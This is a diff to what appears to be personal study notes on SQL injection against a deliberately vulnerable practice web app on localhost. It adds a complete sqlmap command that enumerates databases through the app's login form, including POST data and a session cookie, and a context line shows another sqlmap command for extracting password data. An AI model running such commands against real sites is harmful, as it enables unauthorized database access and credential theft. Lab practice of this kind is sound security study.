@@ -89,6 +89,8 @@ Password data --> $sqlmap -u 127.0.0.1/index.php?page=user-info.php&username=1" 
 
 extra args: --level=2 / --risk=1
 
+Database Extraction Comand --> sqlmap -u 'http://127.0.0.1/index.php?page=user-info.php' --data='username=pa&password=ra&user-info-php-submit-button=View+Account+Details' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' --cookie="showhints=1;security_level=0; PHPSESSID=hereyoursession;" --dbs
+
 
 <details>
 <summary>Details</summary>
